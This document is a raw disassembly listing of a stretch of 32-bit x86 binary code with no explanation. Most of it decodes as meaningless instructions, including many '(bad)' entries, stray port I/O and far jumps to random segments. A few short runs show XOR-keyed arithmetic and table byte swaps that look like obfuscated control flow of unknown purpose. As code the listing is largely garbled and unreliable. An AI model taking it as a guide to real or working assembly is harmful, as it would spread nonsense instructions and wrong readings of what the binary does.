  40c043:	test   DWORD PTR [ecx+ebp*2],0x7b8b1d18
  40c04a:	mov    al,ds:0x7a281392
  40c04f:	xchg   ebp,eax
  40c050:	inc    esi
  40c051:	xchg   esi,eax
  40c052:	mov    dl,0xcd
  40c054:	mov    BYTE PTR [esi-0x70],al
  40c057:	test   al,0xdf
  40c059:	repz cmc 
  40c05b:	mov    ebx,0x5f1bc386
  40c060:	int    0xbc
  40c062:	loop   0x40c0bf
  40c064:	nop
  40c065:	cmp    BYTE PTR [ecx],0x29
  40c068:	imul   DWORD PTR [edx+0x56dc9d9e]
  40c06e:	in     eax,0xb3
  40c070:	push   es
  40c071:	cmp    BYTE PTR ds:0x9a721d9e,dl
  40c077:	mov    ebx,0xebc16fe
  40c07c:	push   0x634e34f9
  40c081:	mov    cl,0x25
  40c083:	or     al,0xc4
  40c085:	rcr    bh,0x6b
  40c088:	push   ebp
  40c089:	inc    ebx
  40c08a:	aam    0x19
  40c08c:	jmp    0x40c097
  40c08e:	mov    dh,0x76
  40c090:	(bad)  
  40c091:	in     al,0x6b
  40c093:	jge    0x40c0b1
  40c095:	lea    ebp,[esi-0x2c]
  40c098:	stc    
  40c099:	idiv   BYTE PTR [edi+ecx*2-0x6d]
  40c09d:	call   0x4b6ba791
  40c0a2:	adc    DWORD PTR ds:0x64c9aa47,edx
  40c0a8:	inc    eax
  40c0a9:	mov    edx,0x41ecd9c4
  40c0ae:	mov    esi,0xfcb05991
  40c0b3:	adc    al,0xd3
  40c0b5:	adc    DWORD PTR [ecx],ebx
  40c0b7:	jne    0x40c124
  40c0b9:	push   edi
  40c0ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c0bb:	int    0xeb
  40c0bd:	jecxz  0x40c08b
  40c0bf:	fsubp  st(6),st
  40c0c1:	mov    ah,0x91
  40c0c3:	dec    esi
  40c0c4:	push   ecx
  40c0c5:	(bad)  
  40c0c6:	repz and DWORD PTR [edx],esi
  40c0c9:	addr16 std 
  40c0cb:	pop    esi
  40c0cc:	xor    esp,DWORD PTR [edi]
  40c0ce:	fst    DWORD PTR [ebp+0x1947ea]
  40c0d4:	xor    BYTE PTR [esi+0x21],cl
  40c0d7:	push   esi
  40c0d8:	pop    edi
  40c0d9:	mov    edi,DWORD PTR [edx+0x62416e99]
  40c0df:	in     al,0x1b
  40c0e1:	cmc    
  40c0e2:	icebp  
  40c0e3:	mov    esi,DWORD PTR [edx]
  40c0e5:	sub    BYTE PTR [edi-0x65010056],al
  40c0eb:	mov    edx,DWORD PTR [ebp-0x3c]
  40c0ee:	mov    edi,DWORD PTR [ebp-0x4]
  40c0f1:	xor    edi,eax
  40c0f3:	xor    edx,eax
  40c0f5:	add    edi,ecx
  40c0f7:	add    edx,ecx
  40c0f9:	imul   edx,edi
  40c0fc:	mov    DWORD PTR [ebp+0xc],edx
  40c0ff:	mov    edx,DWORD PTR [ebp+0xc]
  40c102:	mov    DWORD PTR [ebp-0x24],edx
  40c105:	mov    edx,DWORD PTR [ebp-0x8]
  40c108:	add    edx,DWORD PTR [ebp-0x40]
  40c10b:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40c112:	mov    DWORD PTR [ebp-0x1c],edx
  40c115:	mov    DWORD PTR [ebp-0xc],0xf89c8530
  40c11c:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  40c123:	mov    edx,DWORD PTR [ebp-0x18]
  40c126:	xor    edx,eax
  40c128:	add    edx,ecx
  40c12a:	jmp    0x40ccd1
  40c12f:	mov    edx,DWORD PTR [ebp-0x18]
  40c132:	jmp    0x40c4f0
  40c137:	call   0x9a62:0x428402d0
  40c13e:	out    0xb8,al
  40c140:	mov    di,WORD PTR ds:[ebp+ebp*8+0x67]
  40c146:	jnp    0x40c176
  40c148:	mov    esi,DWORD PTR [eax+0x70]
  40c14b:	lahf   
  40c14c:	jge    0x40c1be
  40c14e:	jo     0x40c171
  40c150:	fwait
  40c151:	rcr    BYTE PTR [eax+0x22f50119],1
  40c157:	mov    ds:0xae130d58,eax
  40c15c:	cmp    al,0xe4
  40c15e:	dec    ebp
  40c15f:	jb     0x40c0ee
  40c161:	dec    eax
  40c162:	mov    ecx,0x89f4cc5
  40c167:	iret   
  40c168:	hlt    
  40c169:	push   ss
  40c16a:	dec    edx
  40c16b:	ror    DWORD PTR [ebp+0x77],0x89
  40c16f:	adc    eax,eax
  40c171:	lock adc eax,0xa78ca8c1
  40c177:	push   es
  40c178:	add    eax,0x644361fc
  40c17d:	xor    esi,DWORD PTR [ebx]
  40c17f:	inc    eax
  40c180:	cld    
  40c181:	add    DWORD PTR [esp+ecx*8+0x42ab2718],ebx
  40c188:	in     eax,dx
  40c189:	pop    es
  40c18a:	inc    esp
  40c18b:	fadd   st,st(5)
  40c18d:	ficom  DWORD PTR [esp+ecx*2-0x4f]
  40c191:	call   0xb1c5:0x2ccc3f35
  40c198:	ins    DWORD PTR es:[edi],dx
  40c199:	xor    eax,0xa2f50a01
  40c19e:	mov    eax,ds:0xe21bd13b
  40c1a3:	sti    
  40c1a4:	(bad)  
  40c1a5:	or     eax,0x358fe12e
  40c1aa:	xor    bl,dl
  40c1ac:	scas   eax,DWORD PTR es:[edi]
  40c1ad:	jl     0x40c1b5
  40c1af:	inc    DWORD PTR [ebx+0x5b89ef1b]
  40c1b5:	adc    BYTE PTR [eax],cl
  40c1b7:	pop    ss
  40c1b8:	push   cs
  40c1b9:	mov    cl,0x7c
  40c1bb:	(bad)  
  40c1bc:	int    0xdd
  40c1be:	push   ecx
  40c1bf:	inc    edx
  40c1c0:	sub    al,0x89
  40c1c2:	push   edi
  40c1c3:	mov    cl,0xd4
  40c1c5:	xor    eax,DWORD PTR [ebx]
  40c1c7:	xor    edi,ebp
  40c1c9:	or     BYTE PTR [eax+0x4f906d69],bl
  40c1cf:	stos   DWORD PTR es:[edi],eax
  40c1d0:	ret    
  40c1d1:	add    DWORD PTR [ebp-0x20be14f0],esp
  40c1d7:	push   edx
  40c1d8:	pop    esp
  40c1d9:	repnz adc BYTE PTR [ebp+0x3b4f50f5],0x41
  40c1e1:	jno    0x40c1b0
  40c1e3:	mov    al,0xe1
  40c1e5:	mov    bl,0x3
  40c1e7:	mov    esi,esp
  40c1e9:	out    0x76,al
  40c1eb:	out    dx,eax
  40c1ec:	cmp    DWORD PTR [esi],edx
  40c1ee:	fwait
  40c1ef:	push   es
  40c1f0:	jo     0x40c17d
  40c1f2:	mov    ds:0x3255acb,al
  40c1f7:	mov    es,WORD PTR [eax]
  40c1f9:	and    edi,DWORD PTR [eax]
  40c1fb:	js     0x40c1a6
  40c1fd:	mov    edi,0x13ec7f6d
  40c202:	inc    edx
  40c203:	scas   eax,DWORD PTR es:[edi]
  40c204:	dec    ebx
  40c205:	sbb    esi,ebp
  40c207:	or     eax,0x146e878
  40c20c:	lea    esi,[edx+edx*1+0x60]
  40c210:	ja     0x40c1dd
  40c212:	xchg   DWORD PTR [esp+edi*1],edi
  40c215:	fild   WORD PTR [ecx+0x6dda24fe]
  40c21b:	js     0x40c1a0
  40c21d:	add    al,cl
  40c21f:	ret    0x5635
  40c222:	mov    bl,0xaa
  40c224:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c225:	ss and ah,bh
  40c228:	push   edi
  40c229:	(bad)  
  40c22a:	in     al,dx
  40c22b:	js     0x40c242
  40c22d:	and    eax,0x1b8384ef
  40c232:	popf   
  40c233:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c234:	jecxz  0x40c1c5
  40c236:	imul   edx,DWORD PTR [ecx],0x41fd4c9
  40c23c:	in     eax,dx
  40c23d:	arpl   cx,cx
  40c23f:	pop    esp
  40c240:	jmp    0x40c267
  40c242:	fs sbb edi,eax
  40c245:	sbb    ch,BYTE PTR ss:[ecx-0x42d4eeae]
  40c24c:	das    
  40c24d:	bound  esi,QWORD PTR [ebp+0x35]
  40c250:	inc    ebp
  40c251:	ficomp WORD PTR ds:0x6e01e1e4
  40c257:	cwde   
  40c258:	outs   dx,BYTE PTR ds:[esi]
  40c259:	or     eax,0xa9ee0d1c
  40c25e:	in     al,0x77
  40c260:	and    esp,ebx
  40c262:	mov    ah,0x7d
  40c264:	in     al,dx
  40c265:	retf   0xb4e2
  40c268:	ins    DWORD PTR es:[edi],dx
  40c269:	loope  0x40c294
  40c26b:	sub    ch,BYTE PTR [esi]
  40c26d:	jno    0x40c2d4
  40c26f:	jns    0x40c2a7
  40c271:	fisubr WORD PTR [ebx]
  40c273:	inc    eax
  40c274:	clc    
  40c275:	jae    0x40c1fd
  40c277:	sbb    esi,DWORD PTR [eax-0x78]
  40c27a:	pop    esp
  40c27b:	in     al,dx
  40c27c:	out    dx,al
  40c27d:	inc    eax
  40c27e:	sbb    ecx,esi
  40c280:	mov    BYTE PTR [ebx-0x1f],al
  40c283:	nop
  40c284:	(bad)  
  40c285:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c286:	adc    eax,0x7f6adc95
  40c28b:	xchg   ecx,eax
  40c28c:	test   DWORD PTR [ebp-0x4d],edi
  40c28f:	push   0x619aa0cd
  40c294:	sbb    esp,DWORD PTR [edi+0x16]
  40c297:	pop    ss
  40c298:	sub    al,0xc
  40c29a:	les    edi,FWORD PTR [ecx+0x2ee17ca3]
  40c2a0:	(bad)  
  40c2a4:	leave  
  40c2a5:	outs   dx,BYTE PTR ds:[esi]
  40c2a6:	je     0x40c2d9
  40c2a8:	push   es
  40c2a9:	jne    0x40c2d3
  40c2ab:	test   BYTE PTR [ebx],0xa4
  40c2ae:	imul   ecx,esi,0x7b
  40c2b1:	outs   dx,BYTE PTR fs:[esi]
  40c2b3:	out    0x85,eax
  40c2b5:	aad    0xdf
  40c2b7:	jmp    0x4267:0xd687d3a0
  40c2be:	push   es
  40c2bf:	shl    DWORD PTR [ebp+0x2d602d0],0x90
  40c2c6:	mov    esi,0x673a8372
  40c2cb:	lock sahf 
  40c2cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2ce:	outs   dx,DWORD PTR ds:[esi]
  40c2cf:	mov    esi,DWORD PTR [edi+0x143e28df]
  40c2d5:	add    DWORD PTR [eax],esi
  40c2d7:	and    al,0xd
  40c2d9:	sbb    dh,dl
  40c2db:	pop    eax
  40c2dc:	je     0x40c32d
  40c2de:	scas   eax,DWORD PTR es:[edi]
  40c2df:	or     al,0x3c
  40c2e1:	adc    al,0xf7
  40c2e3:	addr16 es pop eax
  40c2e6:	ret    
  40c2e7:	sbb    BYTE PTR [ecx],ah
  40c2e9:	mov    cl,bh
  40c2eb:	sub    bl,bl
  40c2ed:	xor    ebp,DWORD PTR [ebp+0x40]
  40c2f0:	xor    BYTE PTR [esp+eiz*4],ch
  40c2f3:	xor    eax,0xffffff88
  40c2f6:	mov    edx,DWORD PTR [edx]
  40c2f8:	pop    ebp
  40c2f9:	int3   
  40c2fa:	xchg   BYTE PTR [eax-0x4369d727],dh
  40c300:	(bad)  
  40c301:	sahf   
  40c302:	cmp    al,BYTE PTR [edx-0x3e]
  40c305:	call   FWORD PTR [edx]
  40c307:	or     al,0x7f
  40c309:	mov    ecx,0x6f30527c
  40c30e:	ins    DWORD PTR es:[edi],dx
  40c30f:	int3   
  40c310:	test   BYTE PTR [eax+0x6fd022c6],ah
  40c316:	loopne 0x40c345
  40c318:	pop    edi
  40c319:	rol    DWORD PTR [ebx+0x76],0x85
  40c31d:	jne    0x40c2ba
  40c31f:	test   ah,bh
  40c321:	pop    ecx
  40c322:	dec    esp
  40c323:	inc    eax
  40c324:	cmp    al,0xd5
  40c326:	ja     0x40c337
  40c328:	jnp    0x40c37e
  40c32a:	push   esi
  40c32b:	sbb    BYTE PTR [edi],0x6c
  40c32e:	adc    eax,0x3b2d512f
  40c333:	jecxz  0x40c37f
  40c335:	cmp    ebx,DWORD PTR ds:0xaba35a61
  40c33b:	mov    al,ds:0x936571a1
  40c340:	dec    ecx
  40c341:	jbe    0x40c361
  40c343:	pop    ds
  40c344:	loop   0x40c31f
  40c346:	inc    ecx
  40c347:	and    BYTE PTR [ecx+0x6a],ah
  40c34a:	out    dx,al
  40c34b:	xor    BYTE PTR gs:[esi],dh
  40c34e:	cs ins DWORD PTR es:[edi],dx
  40c350:	inc    eax
  40c351:	push   ebx
  40c352:	jno    0x40c38c
  40c354:	xlat   BYTE PTR ds:[ebx]
  40c355:	div    esi
  40c357:	mov    eax,ds:0x51e254ce
  40c35c:	jns    0x40c385
  40c35e:	push   ds
  40c35f:	jns    0x40c3cb
  40c361:	sub    DWORD PTR [eax-0x2d],edi
  40c364:	mov    ds:0x2a676760,eax
  40c369:	je     0x40c3c3
  40c36b:	pusha  
  40c36c:	(bad)  
  40c36d:	cmp    al,0xff
  40c36f:	das    
  40c370:	pop    ebx
  40c371:	js     0x40c310
  40c373:	les    edi,FWORD PTR [ebx+0x79]
  40c376:	sbb    eax,0x18c5b66
  40c37b:	xor    al,0x12
  40c37d:	cld    
  40c37e:	jb     0x40c34e
  40c380:	daa    
  40c381:	loope  0x40c3a7
  40c383:	rep lods eax,DWORD PTR ds:[esi]
  40c385:	dec    ecx
  40c386:	lahf   
  40c387:	pop    esp
  40c388:	fs lock add eax,0x7c1690a3
  40c38f:	popa   
  40c390:	xor    DWORD PTR [edx-0xb],0xe497b2be
  40c397:	fistp  QWORD PTR [eax+0x25e28448]
  40c39d:	sub    BYTE PTR [edi-0x2e3dd1dd],dl
  40c3a3:	arpl   WORD PTR [eax],cx
  40c3a5:	rcr    esi,0x5e
  40c3a8:	aad    0xcc
  40c3aa:	xor    DWORD PTR [edx],ebp
  40c3ac:	icebp  
  40c3ad:	adc    DWORD PTR [edi+0x37],ebp
  40c3b0:	ja     0x40c375
  40c3b2:	jne    0x40c3d6
  40c3b4:	nop
  40c3b5:	sub    DWORD PTR [ebx-0x62],ecx
  40c3b8:	mov    ebx,DWORD PTR [edi+0x11ee8956]
  40c3be:	cmc    
  40c3bf:	fwait
  40c3c0:	cmc    
  40c3c1:	cmp    al,0x8c
  40c3c3:	and    ch,BYTE PTR [ecx]
  40c3c5:	imul   esi,DWORD PTR [esi],0x2fb331a
  40c3cb:	cld    
  40c3cc:	inc    ecx
  40c3cd:	out    dx,al
  40c3ce:	mov    dh,BYTE PTR [edi-0x5e]
  40c3d1:	and    eax,0x92745330
  40c3d6:	loopne 0x40c36f
  40c3d8:	dec    DWORD PTR [edi+0x5d]
  40c3db:	mov    cl,BYTE PTR [eax-0xe]
  40c3de:	add    al,0x89
  40c3e0:	fwait
  40c3e1:	push   edx
  40c3e2:	in     al,dx
  40c3e3:	xchg   ebx,eax
  40c3e4:	rcr    BYTE PTR [eax],0x24
  40c3e7:	fild   WORD PTR [eax-0x5d]
  40c3ea:	retf   0xf379
  40c3ed:	xor    al,0xc4
  40c3ef:	jmp    0xd9b3:0x4903bcd9
  40c3f6:	(bad)  
  40c3f7:	jp     0x40c3f5
  40c3f9:	jle    0x40c42e
  40c3fb:	stos   BYTE PTR es:[edi],al
  40c3fc:	xacquire xchg BYTE PTR [esi],cl
  40c3ff:	push   ss
  40c400:	xchg   BYTE PTR [esp+edx*4+0x349f7c6a],dl
  40c407:	push   eax
  40c408:	test   BYTE PTR [ecx],0xe4
  40c40b:	scas   eax,DWORD PTR es:[edi]
  40c40c:	test   al,0xa5
  40c40e:	inc    esi
  40c40f:	test   al,0x3
  40c411:	mov    ch,BYTE PTR ds:0x580343b
  40c417:	dec    edx
  40c418:	fnstsw WORD PTR [edi]
  40c41a:	aad    0x4e
  40c41c:	hlt    
  40c41d:	ror    BYTE PTR [ecx-0x77],1
  40c420:	sub    BYTE PTR [esi+ebp*1+0x304ca99],ah
  40c427:	aad    0xed
  40c429:	and    dl,BYTE PTR [ebx-0x79]
  40c42c:	jge    0x40c3ed
  40c42e:	test   eax,0xad3f00f7
  40c433:	dec    ebx
  40c434:	pop    edi
  40c435:	das    
  40c436:	pop    ds
  40c437:	xchg   edi,eax
  40c438:	clc    
  40c439:	mov    BYTE PTR [ebx-0x6a],dh
  40c43c:	xor    BYTE PTR [ecx],ah
  40c43e:	(bad)  
  40c43f:	cli    
  40c440:	repnz fld TBYTE PTR [eax+eiz*1-0x7af7fa94]
  40c448:	mov    ebx,0xf0bd1fe3
  40c44d:	std    
  40c44e:	add    BYTE PTR [ecx+ebx*2+0x34],ah
  40c452:	test   eax,0x2280bff1
  40c457:	push   ss
  40c458:	xor    al,0x52
  40c45a:	std    
  40c45b:	pop    ebp
  40c45c:	jne    0x40c45a
  40c45e:	aam    0xef
  40c460:	loopne 0x40c494
  40c462:	out    dx,eax
  40c463:	inc    ebx
  40c464:	fadd   st,st(0)
  40c466:	add    DWORD PTR [ebx],0x3a
  40c469:	xchg   edx,eax
  40c46a:	pop    esi
  40c46b:	add    eax,0x1946d5ca
  40c470:	cld    
  40c471:	sub    BYTE PTR [ecx-0x66ec1785],ah
  40c477:	jbe    0x40c47f
  40c479:	out    dx,eax
  40c47a:	mov    edx,esi
  40c47c:	scas   eax,DWORD PTR es:[edi]
  40c47d:	(bad)  
  40c47f:	lds    edi,FWORD PTR [edi-0x979bd54]
  40c485:	out    dx,al
  40c486:	scas   al,BYTE PTR es:[edi]
  40c487:	and    esp,DWORD PTR [edx+0x6e]
  40c48a:	xor    al,0xbd
  40c48c:	mov    dh,0xee
  40c48e:	jns    0x40c50a
  40c490:	xor    dh,BYTE PTR [edx+esi*2+0x61]
  40c494:	inc    ecx
  40c495:	xor    DWORD PTR [edx],esp
  40c497:	outs   dx,DWORD PTR ds:[esi]
  40c498:	js     0x40c41a
  40c49a:	xor    eax,0xc2709e02
  40c49f:	(bad)  
  40c4a0:	sahf   
  40c4a1:	jge    0x40c440
  40c4a3:	and    al,0x5c
  40c4a5:	outs   dx,BYTE PTR ds:[esi]
  40c4a6:	push   0xb36f449a
  40c4ab:	ficom  WORD PTR [ebp+edi*1-0x77242e3a]
  40c4b2:	mov    al,ds:0x5eb63d89
  40c4b7:	xchg   ecx,eax
  40c4b8:	stc    
  40c4b9:	sbb    al,0xc5
  40c4bb:	fimul  DWORD PTR [esi]
  40c4bd:	ret    
  40c4be:	adc    bh,BYTE PTR ds:0x9b83a471
  40c4c4:	push   0xffffffda
  40c4c6:	jecxz  0x40c48c
  40c4c8:	aam    0xaf
  40c4ca:	fwait
  40c4cb:	sbb    bl,BYTE PTR [ecx-0x6239e6ad]
  40c4d1:	push   edx
  40c4d2:	ss jo  0x40c457
  40c4d5:	cmp    dh,bh
  40c4d7:	sub    bl,dl
  40c4d9:	out    dx,al
  40c4da:	cmp    al,0x9a
  40c4dc:	or     eax,0x968dc0db
  40c4e1:	mov    ah,0x91
  40c4e3:	sbb    BYTE PTR [esp+eiz*4+0xa57de4e],ah
  40c4ea:	jne    0x40c4a3
  40c4ec:	addr16 jl 0x40c568
  40c4ef:	ss xor edx,eax
  40c4f2:	add    edx,DWORD PTR [ebp-0x14]
  40c4f5:	mov    edi,DWORD PTR [ebp-0x1c]
  40c4f8:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c4ff:	mov    BYTE PTR [ebp+0xf],dl
  40c502:	mov    edx,DWORD PTR [ebp-0xc]
  40c505:	xor    edx,eax
  40c507:	add    edx,DWORD PTR [ebp-0x14]
  40c50a:	mov    edi,DWORD PTR [ebp-0x1c]
  40c50d:	mov    dl,BYTE PTR [edx+edi*1+0x32729c]
  40c514:	mov    BYTE PTR [ebp+0xb],dl
  40c517:	mov    dl,BYTE PTR [ebp+0xf]
  40c51a:	mov    edi,DWORD PTR [ebp-0xc]
  40c51d:	xor    edi,eax
  40c51f:	add    edi,DWORD PTR [ebp-0x14]
  40c522:	mov    ebx,DWORD PTR [ebp-0x1c]
  40c525:	mov    BYTE PTR [edi+ebx*1+0x32729c],dl
  40c52c:	mov    dl,BYTE PTR [ebp+0xb]
  40c52f:	jmp    0x40c8ed
  40c534:	xchg   esp,eax
  40c535:	dec    ebp
  40c536:	push   es
  40c537:	adc    ecx,eax
  40c539:	push   ecx
  40c53a:	xchg   ebx,eax
  40c53b:	dec    ebp
  40c53c:	lock sbb cl,cl
  40c53f:	pop    edx
  40c540:	mov    al,ch
  40c542:	xchg   DWORD PTR [ecx+0x4d],edx
  40c545:	mov    BYTE PTR [eax+0x70],dh
  40c548:	lahf   
  40c549:	jge    0x40c5bb
  40c54b:	jo     0x40c564
  40c54d:	dec    ecx
  40c54e:	mov    bh,0xe7
  40c550:	ror    BYTE PTR [esi-0xef16bbe],cl
  40c556:	sbb    edi,edx
  40c558:	jae    0x40c521
  40c55a:	das    
  40c55b:	lds    edi,FWORD PTR [eax-0x62]
  40c55e:	pop    ds
  40c55f:	inc    ecx
  40c560:	cmp    eax,0xf6b68530
  40c565:	inc    edi
  40c566:	stos   BYTE PTR es:[edi],al
  40c567:	mov    esi,0x945d436e
  40c56c:	das    
  40c56d:	ins    BYTE PTR es:[edi],dx
  40c56e:	bound  esp,QWORD PTR [ebx-0x7d6c306c]
  40c574:	out    0xd1,eax
  40c576:	sbb    BYTE PTR [ecx],bh
  40c578:	popf   
  40c579:	mov    esi,0x29e3971e
  40c57e:	mov    al,ds:0x7dcdf8e7
  40c583:	popf   
  40c584:	data16 cmp BYTE PTR [eax-0xf],0x9e
  40c589:	cmp    al,0xec
  40c58b:	pop    es
  40c58c:	push   es
  40c58d:	pusha  
  40c58e:	mov    bh,0x5b
  40c590:	xchg   edi,eax
  40c591:	pop    ds
  40c592:	nop
  40c593:	or     DWORD PTR [ecx+0x31b6d84a],edi
  40c599:	arpl   WORD PTR [edi+0x17],ax
  40c59c:	mov    edx,0xc62ed2b5
  40c5a1:	add    eax,0xab0d2456
  40c5a6:	xchg   ebp,eax
  40c5a7:	outs   dx,DWORD PTR ds:[esi]
  40c5a8:	mov    cl,cl
  40c5aa:	mov    al,0x53
  40c5ac:	or     cl,dh
  40c5ae:	call   0xaff0:0x86d1720e
  40c5b5:	call   0xb665:0x86e07f24
  40c5bc:	retf   0x3f34
  40c5bf:	adc    DWORD PTR [eax-0x10],0x5c
  40c5c3:	mov    ch,0x2f
  40c5c5:	xor    al,0xbe
  40c5c7:	aaa    
  40c5c8:	daa    
  40c5c9:	stc    
  40c5ca:	test   eax,0xce605cec
  40c5cf:	aam    0x20
  40c5d1:	jae    0x40c62e
  40c5d3:	(bad)  
  40c5d4:	out    dx,eax
  40c5d5:	sahf   
  40c5d6:	mov    esp,ebp
  40c5d8:	mov    ds:0x8d818b87,al
  40c5dd:	ret    0x50e7
  40c5e0:	jmp    0x1d3e4e66
  40c5e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c5e6:	inc    edi
  40c5e7:	mov    cl,0x6e
  40c5e9:	inc    esi
  40c5ea:	(bad)  
  40c5eb:	popa   
  40c5ec:	push   ecx
  40c5ed:	outs   dx,DWORD PTR ds:[esi]
  40c5ee:	loop   0x40c5fb
  40c5f0:	ror    DWORD PTR [eax-0x5d],0xb9
  40c5f4:	(bad)  
  40c5f5:	cmp    eax,0x3ff5b614
  40c5fa:	aam    0x12
  40c5fc:	xor    edi,DWORD PTR [edx-0x205a64bb]
  40c602:	push   edi
  40c603:	mov    ds:0x14ccac8b,eax
  40c608:	int    0x5a
  40c60a:	xchg   esp,eax
  40c60b:	hlt    
  40c60c:	jl     0x40c5d8
  40c60e:	push   es
  40c60f:	shl    ebp,0x7b
  40c612:	inc    esi
  40c613:	retf   
  40c614:	mov    ds:0xd8a4df8b,eax
  40c619:	into   
  40c61a:	pop    eax
  40c61b:	retf   0xb97f
  40c61e:	dec    ebp
  40c61f:	mov    bh,0xa2
  40c621:	in     al,dx
  40c622:	aad    0x4a
  40c624:	fs stc 
  40c626:	icebp  
  40c627:	push   esp
  40c628:	hlt    
  40c629:	jnp    0x40c632
  40c62b:	out    0xe6,eax
  40c62d:	bound  edx,QWORD PTR [edi-0x5663ec89]
  40c633:	xor    DWORD PTR [ecx-0x1722d775],esp
  40c639:	and    DWORD PTR [ebx+0x7b],eax
  40c63c:	xchg   edi,eax
  40c63d:	ret    
  40c63e:	jne    0x40c690
  40c640:	sbb    DWORD PTR [ecx],ebx
  40c642:	xchg   ebx,eax
  40c643:	sub    ecx,DWORD PTR [ebp-0x3b]
  40c646:	sbb    al,0x0
  40c648:	xchg   ebx,eax
  40c649:	mov    al,cl
  40c64b:	(bad)  
  40c64d:	loopne 0x40c69b
  40c64f:	jmp    0xb809ecbd
  40c654:	ficomp WORD PTR [eax+eax*8-0x747ce14]
  40c65b:	xor    DWORD PTR [esi],ecx
  40c65d:	pusha  
  40c65e:	aam    0x6e
  40c660:	lea    ebp,[ebx-0x4e]
  40c663:	push   es
  40c664:	cs sbb edx,edi
  40c667:	sub    ebx,ebp
  40c669:	push   ss
  40c66a:	nop
  40c66b:	sahf   
  40c66c:	mov    dh,0x83
  40c66e:	mov    edi,0x3fc402ce
  40c673:	pop    eax
  40c674:	mov    ebx,0xbd604e4
  40c679:	ins    BYTE PTR es:[edi],dx
  40c67a:	inc    esi
  40c67b:	std    
  40c67c:	mov    esi,0xcd200d2d
  40c681:	sbb    WORD PTR [edx],cx
  40c684:	add    DWORD PTR [edi+0x22ee02f3],eax
  40c68a:	sbb    cl,BYTE PTR [esi]
  40c68c:	jmp    0x40c6b7
  40c68e:	jl     0x40c6fc
  40c690:	out    dx,eax
  40c691:	faddp  st(2),st
  40c693:	inc    ecx
  40c694:	in     al,0x1e
  40c696:	push   ebx
  40c697:	shl    DWORD PTR [eax],1
  40c699:	and    DWORD PTR [edi-0x2cacb3d0],esi
  40c69f:	aam    0x1e
  40c6a1:	sbb    al,0x32
  40c6a3:	out    dx,eax
  40c6a4:	jle    0x40c673
  40c6a6:	add    esp,edx
  40c6a8:	mov    DWORD PTR [ecx],ecx
  40c6aa:	inc    ebp
  40c6ab:	out    0x28,eax
  40c6ad:	cmp    eax,0xd24dc23
  40c6b2:	or     edi,DWORD PTR [esi]
  40c6b4:	mov    DWORD PTR [edi-0x59],esp
  40c6b7:	sbb    DWORD PTR [esi-0x7f9d658a],eax
  40c6bd:	push   cs
  40c6be:	adc    ebx,esp
  40c6c0:	popf   
  40c6c1:	rol    ebp,1
  40c6c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c6c4:	scas   al,BYTE PTR es:[edi]
  40c6c5:	inc    ebp
  40c6c6:	dec    esi
  40c6c7:	stc    
  40c6c8:	scas   al,BYTE PTR es:[edi]
  40c6c9:	inc    ecx
  40c6ca:	fwait
  40c6cb:	inc    esi
  40c6cc:	inc    edx
  40c6cd:	and    DWORD PTR [ecx+0x11],esi
  40c6d0:	adc    BYTE PTR [esi-0x24],ch
  40c6d3:	mov    edi,0x3e0bc70d
  40c6d8:	adc    edx,esp
  40c6da:	jno    0x40c708
  40c6dc:	loope  0x40c677
  40c6de:	mov    cl,0xc7
  40c6e0:	jne    0x40c702
  40c6e2:	loop   0x40c664
  40c6e4:	or     al,0x81
  40c6e6:	inc    eax
  40c6e7:	js     0x40c725
  40c6e9:	out    dx,al
  40c6ea:	jmp    0x3d7f:0x3a429b5a
  40c6f1:	(bad)  
  40c6f2:	ins    DWORD PTR es:[edi],dx
  40c6f3:	(bad)  
  40c6f4:	jmp    0xcc65:0x26af9b00
  40c6fb:	ret    
  40c6fc:	sub    eax,ecx
  40c6fe:	int3   
  40c6ff:	inc    esi
  40c700:	std    
  40c701:	add    al,BYTE PTR [ecx-0x1e]
  40c704:	cdq    
  40c705:	js     0x40c6bd
  40c707:	and    ch,BYTE PTR [esi+0x64]
  40c70a:	adc    bl,BYTE PTR [edx+0x8]
  40c70d:	xor    cl,dh
  40c70f:	xchg   ebp,eax
  40c710:	inc    ebp
  40c711:	mov    BYTE PTR [eax],ch
  40c713:	scas   eax,DWORD PTR es:[edi]
  40c714:	mov    edx,0x58d9cdf4
  40c719:	mov    esi,0xf0358c88
  40c71e:	gs jmp 0x3ca4:0xcef2cb57
  40c726:	in     eax,0xcd
  40c728:	xchg   edi,eax
  40c729:	repnz int 0x27
  40c72c:	int3   
  40c72d:	outs   dx,DWORD PTR ds:[esi]
  40c72e:	shr    eax,1
  40c730:	inc    ebx
  40c731:	mov    ss,WORD PTR [esi]
  40c733:	jno    0x40c756
  40c735:	fistp  QWORD PTR [edx-0x52]
  40c738:	int3   
  40c739:	and    DWORD PTR [ebx],0x44
  40c73c:	ror    DWORD PTR [ecx],1
  40c73e:	(bad)  
  40c73f:	popa   
  40c740:	cmp    edi,DWORD PTR [ebx+0x25138c0d]
  40c746:	call   0xbecc:0xf53adb44
  40c74d:	adc    al,0x3e
  40c74f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c750:	enter  0xcf28,0x3e
  40c754:	in     eax,dx
  40c755:	or     BYTE PTR [edi],dh
  40c757:	js     0x40c7aa
  40c759:	aaa    
  40c75a:	xor    DWORD PTR [ecx],ecx
  40c75c:	pop    eax
  40c75d:	sar    ch,1
  40c75f:	pop    edi
  40c760:	inc    edx
  40c761:	xor    ecx,0x796c8bc0
  40c767:	and    DWORD PTR [edi],esi
  40c769:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c76a:	jb     0x40c7d2
  40c76c:	dec    edx
  40c76d:	icebp  
  40c76e:	lods   al,BYTE PTR ds:[esi]
  40c76f:	jne    0x40c79a
  40c771:	pop    edi
  40c772:	shr    bh,1
  40c774:	aas    
  40c775:	aam    0x5b
  40c777:	dec    eax
  40c778:	ins    DWORD PTR es:[edi],dx
  40c779:	in     eax,0xdd
  40c77b:	jmp    esi
  40c77d:	icebp  
  40c77e:	enter  0x4073,0xa4
  40c782:	pop    edx
  40c783:	std    
  40c784:	loope  0x40c73a
  40c786:	inc    edi
